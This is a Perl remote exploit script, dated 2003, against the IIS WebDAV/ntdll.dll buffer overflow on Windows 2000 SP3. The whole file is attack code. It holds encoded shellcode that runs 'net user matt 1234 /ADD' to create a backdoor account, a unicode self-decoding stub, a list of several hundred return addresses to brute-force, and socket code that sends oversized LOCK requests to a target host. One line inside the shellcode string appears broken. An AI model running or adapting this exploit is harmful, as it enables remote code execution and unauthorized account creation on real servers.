#!/bin/perl
#
# 2003.3.24
#
# mat@monkey.org
# mat@panicsecurity.org
#
# tested on Windows 2000 Advanced Server SP3: Korean language edition
# ntdll.dll with 2002.7.3 version
# You need to change some parameters to make this exploit work on your platform of choice
#
# This exploit uses unicode decoder scheme and self-modifies unicoded shellcode to original one.
#

use Socket;

if($#ARGV<0)
{
        die "usage: wd.pl <target hostname>\n";
}

my $host=$ARGV[0];

my $url_len=65514;
#LOCK: 65514
#SEARCH: 65535

my $host_header="Host: $host\r\n";
my $translate_f="Translate: f\r\n";
$translate_f="";
my $port=80;
my $depth="Depth: 1\r\n";
$depth="";
my $connection_str="Connection: Close\r\n";
$connection_str="";
my $url2="B";
$url2="";
my $cont="C";
my $lock_token="Lock-Token: $cont\r\n";
$lock_token="";
my $destination="Destination: /$url2\r\n";
$destination="";

# LoadLibrary: 0x100107c;
# GetProcAddress 0x1001034;
# WinExec("net user matt 1234 /ADD")
# this shellcode is encoded to printable string form
my $shellcode="\x34\x34\x30\x2e\x2c\x2a\x61\x62\x48\x48\x2a\x2a\x2c\x2d\x7f\x80\x68\x69\x2c\x2c\x18\x19\x64\x65\x58\x59\x0c\x07%u0411%u00f0\x67\x67\x2c\x2a\x31\x2e\x18\x19\x64\x65\x58\x59\x7e\x7f\x56\x56\x1a\x1a\x4c\x4d\x55\x55\x71\x71\x7d\x7d\x38\x39\x4c\x4d\x4c\x4d\x4c\x4d\x4c\x4d\x62\x62\x0c\x0c\x3b\x39\x4e\x4e\x6c\x6d\x6c\x6d\x4c\x4d\x38\x38\x5f\x60\x4c\x4d\x4c\x4d\x4c\x4d\x64\x64\x67\x68\x78\x79\x72\x73\x44\x45\x4c\x4d\x4c\x4c\x61\x62\x33\x33\x45\x46\x08\x08\x2d\x2d\x60\x60\x08\x08\x33\x34\x64\x64\x67\x68\x65\x65\x78\x79\x56\x57\x44\x45\x4c\x4d\x4c\x4c\x61\x62\x33\x33\x45\x46\x64\x65\x1a\x1b\x0e\x0f\x2c\x2d\x76\x76\x31\x31\x60\x61\x19\x19\x60\x60\x3d\x3e\x3b\x38\x2d\x2d\x0c\x08\x16\x16\x07\x08\x6c\x6d\x6c\x6d\x4c\x4d\x0c\x08\x12\x12\x03\x03\x6c\x6d\x6c\x6d\x4c\x4d\x79\x7a\x4f\x50\x60\x60\x38\x39\x31\x2e\x33\x33\x33\x33\x33\x33\x54\x54\x27\x24\x65\x66\x08\x08\x3b\x38\x0c\x0c\x2d\x2e\x29\x29\x6c\x6d\x6c\x6d\x4c\x4d\x65\x66\x33\x33\x06\x06\x03\x03\x6c\x6d\x6c\x6d\x4c\x4d\x33\x33\x16\x16\x38\x38\x6c\x6d\x6c\x6d\x4c\x4d\x08\x08\x39\x39\x0c\x0c\x2d\x2d\x3b\x39\x6c\x6d\x6c\x6d\x4c\x4d\x65\x65\x64\x65\x08\x08\x2d\x2d\x33\x33\x06\x06\x1d\x1d\x6c\x6d\x6c\x6d\x4c\x4d\x65\x65\x33\x33\x06\x06\x1f\x1f\x6c\x6d\x6c\x6d\x4c\x4d\x54\x54\x27\x24\x04\x05\x04\x05\x65\x66\x08\x08\x3b\x38\x0c\x0c\x2d\x2e\x27\x27\x6c\x6d\x6c\x6d\x4c\x4d\x65\x66\x33\x33\x06\x06\x19\x19\x6c\x6d\x6c\x6d\x4c\x4d\x33\x33\x06\x06\x1b\x1b\x6c\x6d\x6c\x6d\x4c\x4d\x69\x69\x6e\x6e\x65\x66\x6b\x6c\x6e\x6e\x6a\x6b\x55\x55\x55\x56\x4c\x4d\x63\x63\x7a\x7b\x7d\x7d\x75\x76\x7e\x7e\x7c\x7c\x76\x77\x4c\x4d\x63\x63\x7a\x7b\x77\x77\x75\x76\x78\x78\x76\x77\x7e\x7e\x4c\x4d\x63\x63\x7a\x7b\x7d\x7d\x7a\x7b\x7b\x7b\x75\x75\x7e\x7e\x4c\x4d\x67\x67\x78\x78\x7b\x7c\x6e\x6e\x70\x71\x7e\x7e\x7d\x7d\x4c\x4d\x6e\x6e\x70\x71\x78\x78\x76\x77\x64\x65\x75\x76\x7b\x7b\x7d\x7d\x7e\x7e\x75\x75\x75\x75\x4c\x4d\x7d\x7d\x51\x52\x62\x63\x76\x77\x5d\x5a\x7e\x7e\x70\x71\x7e\x7e\x4c\x4d\x4c\x4d\x4c\x4d\x4c\x4d\x7b\x7c\x7e\x7e\x76\x77\x5e\x5b\x76\x76\x75\x75\x7e\x7e\x75\x76\x5e\x5b\x7a\x7a\x7c\
5\x56\x57\x5e\x5b\x5b\x5b\x7c\x7c\x7e\x7f\x7e\x7f\x4c\x4d\x4c\x4d\x4c\x4d\x4c\x4d\x76\x77\x5d\x5a\x7e\x7e\x70\x71\x7e\x7e\x4c\x4d\x4e\x4e\x4c\x4d\x4c\x4d\x4c\x4d\x76\x77\x7e\x7e\x75\x75\x76\x77\x49\x4a";

my $body="<?xml version=\"1.0\">\r\n<g:searchrequest xmlns:g=\"DAV:\">\r\n<g:sql>\r\nSelect \"DAV:displayname\" from scope()\r\n</g:sql>\r\n</g:searchrequest>\r\n";
my $length_of_body=length($body);

#
# jmp ebx,call ebx addresses
#
my @return_addresses=(
 "%u32ac%u77e2",
 "%uc1b5%u76ae",
 "%u005d%u77a5",
 "%u0060%u776b",
 "%u00b4%u77a5",
 "%u00e6%u77ac",
 "%u014a%u7766",
 "%u0392%u7511",
 "%u03a0%u7511",
 "%u0900%u6df1",
 "%u0900%u778b",
 "%u1167%u6b32",
 "%u1184%u6ed4",
 "%u1192%u6b3e",
 "%u11b1%u779e",
 "%u11b9%u777f",
 "%u11b9%u782c",
 "%u11d3%u7834",
 "%u1800%u749e",
 "%u20ac%u777f",
 "%u215c%u777e",
 "%u2171%u7766",
 "%u2172%u6b3a",
 "%u2191%u6e6f",
 "%u21d4%u6e6f",
 "%u2283%u730a",
 "%u24b9%u7763",
 "%u24d5%u7763",
 "%u24e8%u7761",
 "%u2503%u7834",
 "%u2514%u77e2",
 "%u251e%u77db",
 "%u2521%u7761",
 "%u2527%u77db",
 "%u2530%u77db",
 "%u253c%u77e2",
 "%u2547%u77dc",
 "%u2592%u77dc",
 "%u266d%u76ae",
 "%u2e00%u76ae",
 "%u300e%u74da",
 "%u300e%u74e3",
 "%u306c%u7766",
 "%u30a5%u77e5",
 "%u30b0%u77e5",
 "%u327b%u6e44",
 "%u327b%u6e5e",
 "%u329b%u6e44",
 "%u329b%u6e5e",
 "%u329c%u77e2",
 "%u3384%u7779",
 "%u3384%u777e",
 "%u3397%u6e00",
 "%u33d0%u76ae",
 "%u3700%u777f",
 "%u4e5e%u7900",
 "%u4ea4%u7325",
 "%u4ec0%u77db",
 "%u4ef2%u77ac",
 "%u4f73%u749f",
 "%u4fd4%u77dc",
 "%u4ff1%u749f",
 "%u5023%u749f",
 "%u5078%u77a5",
 "%u5112%u77dc",
 "%u5121%u749f",
 "%u5144%u77dc",
 "%u5146%u77e2",
 "%u514e%u77ac",
 "%u518d%u6dee",
 "%u51c4%u7387",
 "%u5237%u77ac",
 "%u52a0%u777f",
 "%u52a0%u782c",
 "%u52d5%u777f",
 "%u52d5%u782c",
 "%u52f8%u7800",
 "%u5339%u6b3a",
 "%u5339%u777f",
 "%u5366%u7740",
 "%u555e%u741b",
 "%u5653%u749e",
 "%u5718%u6c7e",
 "%u574d%u7901",
 "%u5775%u7901",
 "%u5806%u7325",
 "%u5821%u777f",
 "%u5821%u782c",
 "%u5831%u777f",
 "%u5831%u782c",
 "%u587c%u777f",
 "%u587c%u782c",
 "%u58c5%u777f",
 "%u58d5%u777f",
 "%u58fd%u777f",
 "%u58fd%u782c",
 "%u5949%u72fc",
 "%u5949%u777f",
 "%u5955%u72fc",
 "%u5967%u777f",
 "%u5997%u777f",
 "%u5997%u782c",
 "%u59bb%u777e",
 "%u59d4%u777e",
 "%u5a25%u777f",
 "%u5a25%u782c",
 "%u5ac9%u777f",
 "%u5b5a%u6c7e",
 "%u5b64%u777f",
 "%u5b8f%u6731",
 "%u5b9c%u6731",
 "%u5b9c%u6e44",
 "%u5c04%u777f",
 "%u5c0f%u6c7e",
 "%u5c3b%u777f",
 "%u5c3b%u782c",
 "%u5c4e%u6c7e",
 "%u5cfb%u76ae",
 "%u5da0%u7511",
 "%u5da2%u777f",
 "%u5de6%u77e5",
 "%u5deb%u777f",
 "%u5deb%u782c",
 "%u5e00%u6c11",
 "%u5e0c%u7325",
 "%u5e2b%u777f",
 "%u5e3f%u7511",
 "%u5e55%u777f",
 "%u5e63%u7325",
 "%u5eb8%u7325",
 "%u5ef7%u7325",
 "%u5f13%u7325",
 "%u5f17%u77e3",
 "%u5f1b%u777f",
 "%u5f1b%u782c",
 "%u5f62%u7325",
 "%u5f7f%u72fc",
 "%u5f99%u7325",
 "%u5fb7%u6c11",
 "%u5fcc%u7763",
 "%u601d%u77dc",
 "%u609a%u7387",
 "%u60f6%u72fc",
 "%u611f%u77bf",
 "%u6144%u74da",
 "%u6144%u74e3",
 "%u6198%u7763",
 "%u61a9%u74da",
 "%u61a9%u74e3",
 "%u61fa%u66c7",
 "%u61fa%u671b",
 "%u620a%u7325",
 "%u6284%u66c7",
 "%u62c8%u7763",
 "%u62db%u72fc",
 "%u62f1%u72fc",
 "%u63a9%u77bc",
 "%u63ed%u779e",
 "%u64bb%u7761",
 "%u64c1%u72fd",
 "%u64e2%u777f",
 "%u64e2%u782c",
 "%u64f4%u777f",
 "%u65b9%u6ed4",
 "%u6600%u6ed4",
 "%u66a0%u6c6d",
 "%u66b3%u6c6d",
 "%u66f3%u6c6d",
 "%u66f8%u7387",
 "%u674f%u7763",
 "%u67b0%u7740",
 "%u67b3%u6ed4",
 "%u67d2%u749e",
 "%u6816%u6ed4",
 "%u6842%u779e",
 "%u6881%u779e",
 "%u6894%u779e",
 "%u68b3%u777e",
 "%u6977%u76ae",
 "%u6a19%u7763",
 "%u6a44%u7763",
 "%u6aa3%u7518",
 "%u6c60%u77bc",
 "%u6c81%u7693",
 "%u6c82%u77bf",
 "%u6c92%u77bc",
 "%u6cb8%u7693",
 "%u6cdb%u777f",
 "%u6ce5%u777f",
 "%u6ceb%u7693",
 "%u6d11%u777f",
 "%u6d11%u782c",
 "%u6d87%u77dc",
 "%u6d89%u7693",
 "%u6e2f%u7693",
 "%u6e4d%u76ae",
 "%u6f94%u77e9",
 "%u6fae%u77bc",
 "%u6fe9%u749e",
 "%u7006%u77e9",
 "%u7028%u7901",
 "%u70ab%u77ac",
 "%u70ac%u7387",
 "%u70dd%u77ac",
 "%u70dd%u784f",
 "%u70fd%u77bb",
 "%u711a%u6731",
 "%u7199%u7387",
 "%u71d0%u77bb",
 "%u71fc%u77bb",
 "%u722d%u6df3",
 "%u7258%u7515",
 "%u725f%u77db",
 "%u72a2%u77a5",
 "%u72c4%u7325",
 "%u73fe%u6ed4",
 "%u745f%u76ae",
 "%u748b%u730a",
 "%u74d8%u6df3",
 "%u74e3%u6df3",
 "%u7575%u7518",
 "%u7642%u6c0f",
 "%u76de%u7325",
 "%u7704%u7325",
 "%u77dc%u7693",
 "%u78a9%u77e2",
 "%u78bb%u77bb",
 "%u790e%u6995",
 "%u797a%u6995",
 "%u79b1%u6995",
 "%u79b1%u7740",
 "%u79d1%u77bb",
 "%u79e7%u6995",
 "%u79e9%u72fd",
 "%u7a00%u78fb",
 "%u7a05%u72fd",
 "%u7a3b%u72fd",
 "%u7a57%u7387",
 "%u7aba%u6995",
 "%u7af9%u6c13",
 "%u7b19%u76ae",
 "%u7b6e%u777f",
 "%u7b6e%u782c",
 "%u7c83%u7763",
 "%u7c97%u7763",
 "%u7ca5%u7763",
 "%u7d8f%u77e5",
 "%u7dbe%u779e",
 "%u7de1%u779e",
 "%u7e1f%u6df1",
 "%u7e1f%u778b",
 "%u7e52%u6995",
 "%u7f55%u77a5",
 "%u7fa8%u77a5",
 "%u7fd5%u76ae",
 "%u8018%u775b",
 "%u807d%u7387",
 "%u80a5%u775b",
 "%u8178%u775b",
 "%u81c0%u77db",
 "%u82ad%u6c11",
 "%u82d5%u65f1",
 "%u832f%u77db",
 "%u8339%u76ae",
 "%u83d3%u6df3",
 "%u843d%u7387",
 "%u8563%u77ac",
 "%u8805%u7740",
 "%u881f%u77db",
 "%u8840%u77bc",
 "%u8892%u7740",
 "%u8892%u77ac",
 "%u8a23%u6731",
 "%u8a23%u7693",
 "%u8a23%u77ad",
 "%u8af1%u76ae",
 "%u8b17%u6ed4",
 "%u8b39%u76ae",
 "%u8c6b%u77bf",
 "%u8c7a%u77bc",
 "%u8ca2%u77bc",
 "%u8cac%u6df1",
 "%u8cac%u778b",
 "%u8d70%u6995",
 "%u8dbe%u7740",
 "%u8dcb%u77ad",
 "%u8dcf%u777e",
 "%u8e87%u6995",
 "%u8f09%u6b32",
 "%u9187%u76ae",
 "%u925e%u749e",
 "%u92f8%u77ad",
 "%u932e%u76ae",
 "%u93ac%u7740",
 "%u9640%u6995",
 "%u980a%u7763",
 "%u984e%u6df3",
 "%u985e%u7763",
 "%u98dc%u7740",
 "%u9920%u7916",
 "%u9957%u77a5",
 "%u9a5a%u779e",
 "%u9b27%u6ed3",
 "%u9cf6%u7518",
 "%u9d26%u7518",
 "%u9d5d%u7300",
 "%u9d72%u7763",
 "%u9edc%u7901",
 "%u9ede%u77e9",
 "%ua300%u76ae",
 "%uac16%u7900",
 "%uac17%u77db",
 "%uac17%u7832",
 "%uac4b%u77db",
 "%uac4b%u7900",
 "%uac52%u76ae",
 "%uac5a%u76ae",
 "%uac71%u7693",
 "%uac84%u77e9",
 "%uac97%u77e3",
 "%uaca2%u6ed3",
 "%uaca4%u6c0f",
 "%uaca4%u77e9",
 "%uacac%u6c0f",
 "%uacaf%u77e3",
 "%uacb6%u6ed3",
 "%uacc8%u7693",
 "%uace0%u7761",
 "%uacfb%u7761",
 "%uad0d%u77e2",
 "%uad13%u7900",
 "%uad18%u779e",
 "%uad25%u7900",
 "%uad27%u6ed3",
 "%uad45%u77e2",
 "%uad5b%u7900",
 "%uad5f%u7387",
 "%uad73%u6995",
 "%uad73%u6b32",
 "%uad7a%u6b32",
 "%uada6%u775b",
 "%uadab%u7900",
 "%uadc4%u7387",
 "%uadf0%u76ae",
 "%uadf9%u6995",
 "%uae12%u76ae",
 "%uae80%u77e5",
 "%uae96%u77e5",
 "%uaf17%u77e3",
 "%uafa2%u779e",
 "%ub00a%u77e5",
 "%ub05d%u77e5",
 "%ub0c0%u6b32",
 "%ub0ef%u7518",
 "%ub100%u6b32",
 "%ub100%u7518",
 "%ub119%u7518",
 "%ub138%u672e",
 "%ub169%u6b32",
 "%ub177%u672e",
 "%ub181%u6b32",
 "%ub1cb%u6ed4",
 "%ub1da%u6ed4",
 "%ub206%u6b32",
 "%ub216%u6c0f",
 "%ub23f%u7802",
 "%ub240%u7693",
 "%ub246%u6c0f",
 "%ub260%u7693",
 "%ub273%u76ae",
 "%ub276%u6c0f",
 "%ub27e%u779e",
 "%ub288%u76ae",
 "%ub293%u77e2",
 "%ub29c%u72fd",
 "%ub2a3%u6c0f",
 "%ub2b7%u72fd",
 "%ub2ca%u77e2",
 "%ub2ef%u76ae",
 "%ub342%u76ae",
 "%ub3a2%u749e",
 "%ub3b8%u749e",
 "%ub3be%u749e",
 "%ub3c3%u741b",
 "%ub3f4%u741b",
 "%ub405%u7802",
 "%ub43a%u76ae",
 "%ub44e%u6df1",
 "%ub44e%u778b",
 "%ub450%u76ae",
 "%ub456%u6df1",
 "%ub456%u778b",
 "%ub468%u6ed3",
 "%ub483%u76ae",
 "%ub484%u72fd",
 "%ub48b%u72fd",
 "%ub498%u76ae",
 "%ub4a6%u6995",
 "%ub4af%u76ae",
 "%ub4c0%u76ae",
 "%ub4e8%u7832",
 "%ub52d%u6995",
 "%ub549%u77db",
 "%ub554%u6995",
 "%ub565%u77db",
 "%ub56e%u77e9",
 "%ub61d%u7763",
 "%ub61f%u77e9",
 "%ub62c%u7763",
 "%ub652%u77e9",
 "%ub65e%u77e9",
 "%ub66a%u77e9",
 "%ub6a4%u77db",
 "%ub6a7%u7900",
 "%ub6af%u6ed4",
 "%ub6b7%u6ed4",
 "%ub6b8%u77db",
 "%ub6d5%u7900",
 "%ub6dd%u77ad",
 "%ub6dd%u77b0",
 "%ub6ec%u77ad",
 "%ub6ec%u77b0",
 "%ub6f4%u77ad",
 "%ub6f4%u77b0",
 "%ub6f7%u7763",
 "%ub6fc%u749e",
 "%ub70e%u77ad",
 "%ub712%u749e",
 "%ub718%u749e",
 "%ub778%u77e9",
 "%ub784%u77e9",
 "%ub790%u77e9",
 "%ub79c%u77e9",
 "%ub7a8%u77e9",
 "%ub7ac%u77ad",
 "%ub7b4%u77e9",
 "%ub7c0%u77e9",
 "%ub7cc%u77e9",
 "%ub7d8%u77e9",
 "%ub803%u775b",
 "%ub819%u77ad",
 "%ub992%u7763",
 "%ub9aa%u7832",
 "%ub9ce%u7763",
 "%ub9d6%u7832",
 "%uba10%u7832",
 "%uba38%u7832",
 "%uba6b%u77ad",
 "%uba6b%u77b0",
 "%uba73%u77ac",
 "%uba74%u77ad",
 "%uba74%u77b0",
 "%uba7a%u77ad",
 "%uba7a%u77b0",
 "%uba7e%u77ad",
 "%uba7e%u77b0",
 "%uba8e%u7834",
 "%uba9f%u7900",
 "%ubaa8%u7834",
 "%ubaae%u6876",
 "%ubae8%u7900",
 "%ubb34%u6876",
 "%ubc0f%u77e5",
 "%ubc37%u77e5",
 "%ubcf9%u7834",
 "%ubd00%u6c0f",
 "%ubd24%u7834",
 "%ubd38%u6c0f",
 "%ubd65%u6c0f",
 "%ubdb3%u672e",
 "%ubdc8%u7740",
 "%ubde6%u77db",
 "%ube03%u672e",
 "%ube1a%u7740",
 "%ube30%u7901",
 "%ube31%u77e5",
 "%ube43%u7901",
 "%ube53%u6995",
 "%ube65%u77db",
 "%ube75%u77e5",
 "%ube87%u77db",
 "%ubebd%u77db",
 "%ubecf%u6995",
 "%ubef8%u6995",
 "%ubf37%u7834",
 "%ubf45%u7834",
 "%ubf65%u76ae",
 "%ubf83%u7900",
 "%ubf8a%u6995",
 "%ubf92%u7900",
 "%ubf9e%u7900",
 "%ubfaa%u7900",
 "%ubfba%u76ae",
 "%ubfbf%u6c7e",
 "%ubfc5%u77db",
 "%ubfd2%u7900",
 "%ubfe1%u7900",
 "%ubfed%u7900",
 "%ubff9%u7900",
 "%uc003%u76ae",
 "%uc02e%u77db",
 "%uc02f%u77db",
 "%uc036%u6995",
 "%uc03a%u77db",
 "%uc03e%u6c7e",
 "%uc03f%u6995",
 "%uc054%u76ae",
 "%uc058%u6c7e",
 "%uc0d5%u76ae",
 "%uc0ee%u76ae",
 "%uc120%u76ae",
 "%uc142%u76ae",
 "%uc189%u65f1",
 "%uc1bc%u65f1",
 "%uc1ef%u65f1",
 "%uc1f3%u6b32",
 "%uc1f7%u77e2",
 "%uc21f%u6b32",
 "%uc268%u76ae",
 "%uc268%u77e2",
 "%uc277%u76ae",
 "%uc27f%u7834",
 "%uc286%u76ae",
 "%uc291%u77e2",
 "%uc295%u76ae",
 "%uc2a8%u76ae",
 "%uc2d1%u76ae",
 "%uc2e0%u76ae",
 "%uc2ef%u76ae",
 "%uc2fe%u76ae",
 "%uc306%u7834",
 "%uc30d%u76ae",
 "%uc32a%u7834",
 "%uc344%u7834",
 "%uc35e%u7834",
 "%uc39d%u6ed4",
 "%uc3de%u6ed4",
 "%uc3df%u6df1",
 "%uc3df%u778b",
 "%uc401%u7834",
 "%uc445%u7834",
 "%uc449%u6df1",
 "%uc449%u778b",
 "%uc459%u7834",
 "%uc4f0%u7834",
 "%uc504%u77dc",
 "%uc56b%u7834",
 "%uc578%u77e9",
 "%uc57a%u6c0f",
 "%uc583%u76ae",
 "%uc597%u76ae",
 "%uc5d6%u77ac",
 "%uc5d7%u77ac",
 "%uc5e1%u77ac",
 "%uc5eb%u77ac",
 "%uc663%u76ae",
 "%uc676%u6e44",
 "%uc676%u6e5e",
 "%uc677%u76ae",
 "%uc6f3%u6c42",
 "%uc748%u76ae",
 "%uc776%u76ae",
 "%uc7a0%u77e2",
 "%uc7da%u6b32",
 "%uc7e1%u6b32",
 "%uc7e5%u77e2",
 "%uc860%u72c2",
 "%uc860%u775b",
 "%uc86d%u72c2",
 "%uc86d%u775b",
 "%uc87d%u72c2",
 "%uc87d%u775b",
 "%uc88d%u72c2",
 "%uc88d%u775b",
 "%uc89d%u72c2",
 "%uc89d%u775b",
 "%uc8ad%u72c2",
 "%uc8ad%u775b",
 "%uc8ba%u72c2",
 "%uc8ba%u775b",
 "%uc8c7%u72c2",
 "%uc8c7%u775b",
 "%uc8d4%u72c2",
 "%uc8d4%u775b",
 "%uc8e0%u77ac",
 "%uc8fc%u77db",
 "%uc936%u77db",
 "%uc9d3%u77ac",
 "%uc9f5%u6c0f",
 "%uca02%u77ac",
 "%uca25%u77ac",
 "%uca2e%u6c0f",
 "%uca5b%u77e9",
 "%uca84%u77e9",
 "%ucad1%u77e9",
 "%ucaf1%u77e9",
 "%ucb4f%u749e",
 "%ucb72%u76ae",
 "%ucb7a%u751a",
 "%ucb7b%u76ae",
 "%ucb7e%u7763",
 "%ucb85%u7763",
 "%ucb8f%u751a",
 "%ucb98%u749e",
 "%ucba4%u751a",
 "%ucbae%u749f",
 "%ucbd0%u77db",
 "%ucc05%u749f",
 "%ucc53%u76ae",
 "%ucc81%u6df5",
 "%ucc89%u6df5",
 "%ucc8a%u76ae",
 "%uccb5%u7901",
 "%uccc7%u760d",
 "%uccd6%u741b",
 "%uccda%u760d",
 "%ucd00%u741b",
 "%ucd0f%u7901",
 "%ucd2a%u741b",
 "%ucd31%u7901",
 "%ucd3c%u7518",
 "%ucd3c%u7901",
 "%ucdb0%u7761",
 "%ucdb5%u7761",
 "%ucdb8%u7761",
 "%ucdf4%u741b",
 "%ucdf9%u77e5",
 "%uce2e%u7518",
 "%uce46%u741b",
 "%uce6a%u77e5",
 "%uce74%u7518",
 "%uce93%u77e5",
 "%uce98%u7518",
 "%ucf69%u6df5",
 "%ucf71%u6df5",
 "%ucf9c%u76ae",
 "%ucfa6%u76ae",
 "%ud067%u77db",
 "%ud0a2%u77db",
 "%ud0c5%u6b32",
 "%ud109%u6b32",
 "%ud11b%u77dc",
 "%ud163%u7901",
 "%ud17c%u7900",
 "%ud181%u7900",
 "%ud1a6%u749f",
 "%ud1d2%u77ac",
 "%ud1e0%u7901",
 "%ud1ed%u77ac",
 "%ud1f7%u749f",
 "%ud1f7%u7900",
 "%ud1fc%u7900",
 "%ud206%u7763",
 "%ud21c%u7834",
 "%ud221%u7763",
 "%ud225%u7834",
 "%ud259%u6df5",
 "%ud279%u749f",
 "%ud287%u7834",
 "%ud290%u7834",
 "%ud2b6%u77e5",
 "%ud2cd%u7900",
 "%ud2d2%u7900",
 "%ud2e1%u741b",
 "%ud2f5%u741b",
 "%ud2f5%u77e5",
 "%ud309%u741b",
 "%ud31d%u741b",
 "%ud38a%u7901",
 "%ud3aa%u7763",
 "%ud3b9%u7763",
 "%ud3bf%u7901",
 "%ud3d7%u7763",
 "%ud3db%u77dc",
 "%ud4f5%u6b32",
 "%ud514%u77ac",
 "%ud51e%u77ac",
 "%ud52d%u77e5",
 "%ud539%u6b32",
 "%ud541%u6df5",
 "%ud545%u7800",
 "%ud6dc%u77d7",
 "%ud6e2%u77a5",
 "%ud700%u77e2",
 "%ud75b%u7900",
 "%ud780%u7900",
 "%ue00e%u7900",
 "%ue010%u7738",
 "%ue020%u77db",
 "%ue02b%u77ac",
 "%ue04c%u7738",
 "%ue04e%u6ed4",
 "%ue056%u6ed4",
 "%ue0ad%u779e",
 "%ue0af%u7800",
 "%uec00%u672e",
 "%uf906%u7800",
 "%uf909%u7763",
 "%uf93f%u7763",
 "%uf942%u751a",
 "%uf94b%u77e9",
 "%uf964%u77ac",
 "%uf966%u7763",
 "%uf968%u751a",
 "%uf974%u77ac",
 "%uf981%u751a",
 "%uf991%u7763",
 "%uf9a6%u7300",
 "%uf9b3%u751a",
 "%uf9c2%u7763",
 "%uf9cd%u751a",
 "%uf9e9%u7763",
 "%uf9fb%u7300"
);


foreach my $return_address (@return_addresses)
{
 ######### return address ############
 my $return_address_part="";
 $return_address_part="";
 $return_address_part.="%u3073";
 $return_address_part.="%u3075";
 $return_address_part.="%u3074";
 $return_address_part.=$return_address;
 $return_address_part.="%ucc38"x22;
 #####################################

 ############  offsets ##############
 my $offset_len=280;
 my $offset_part="X"x$offset_len;
 #####################################
 my $shellcode_len=$url_len-(length($return_address_part)/6+$offset_len);

 my $offset_of_part_shell=0;
 print "len-> $url_len=$shellcode_len:$offset_len\n";


 my $decoder_str="%uC931%u79B1%uc1fe%ucb01%uc38b%uc789%uc289%uc931%u9041%u9041%uc38b%uc801%u338b%uce8b%u308b%uc68b%uc801%u00b4%uc689%uc78b%u3089%uc931%u03b1%u9041%ucb01%u9047%uf989%ud129%uc031%ue0b0%u03b4%uc129%uc985%uca75%uc985";
 my $decoder_str_len=length($decoder_str)/6;
 my $patch_esp="\x44\x45\x76\x76";
 my $nop="%u0048%u0048";
 my $encoded_str="${nop}${patch_esp}${shellcode}";
 my $unicoded_encoded_str_len=4*5;

 my $shellcode_part="";
 $shellcode_part="";
 $shellcode_part.=$decoder_str;
 $shellcode_part.=$encoded_str;
 $shellcode_part.="A"x($shellcode_len-($decoder_str_len+length($encoded_str)-$unicoded_encoded_str_len-1));

 my $url="/${offset_part}${return_address_part}${shellcode_part}";
 for my $METHOD ("LOCK")
 {
  my $string_to_send="$METHOD $url HTTP/1.1\r\n${host_header}${destination}${lock_token}${translate_f}${depth}Content-Type: text/xml\r\nContent-Length: $length_of_body\r\n${connection_str}\r\n${body}";
  my $results="";
  $results="";
  while($results eq "")
  {
   print STDERR "Retrying Connection...\n";
   $results=sendraw2("GET / HTTP/1.0\r\n\r\n",$host,$port,15);
   if($results eq "")
   {
    sleep(1);
   }
  }
  print STDERR "Trying with [$return_address]\n";
  $results=sendraw2($string_to_send,$host,$port,15);
  if($results eq "")
  {
   print "Connection refused: Server crashed?\n";
  }else{
   print "Failed to exploit: Server not crashed\n";
  }
 }
}

sub sendraw2
{
 my ($pstr,$realip,$realport,$timeout)=@_;
 my $target2=inet_aton($realip);

 my $flagexit=0;
 $SIG{ALRM}=\&ermm;
 socket(S,PF_INET,SOCK_STREAM,getprotobyname('tcp')||0) || return "0";
 #die("Socket problems");
 alarm($timeout);
 if(connect(S,pack "SnA4x8",2,$realport,$target2))
 {
  alarm(0);
  my @in;
  select(S); $|=1;
  print $pstr;
  alarm($timeout);
  while(<S>){
   if($flagexit == 1)
   {
    close (S);
    return "Timeout";
   }
   push @in, $_;
  }
  alarm(0);
  select(STDOUT);
  close(S);
  return join '',@in;
        }else{
  close(S);
  return "";
 }
}

sub ermm
{
 $flagexit=1;
 close (S);
}
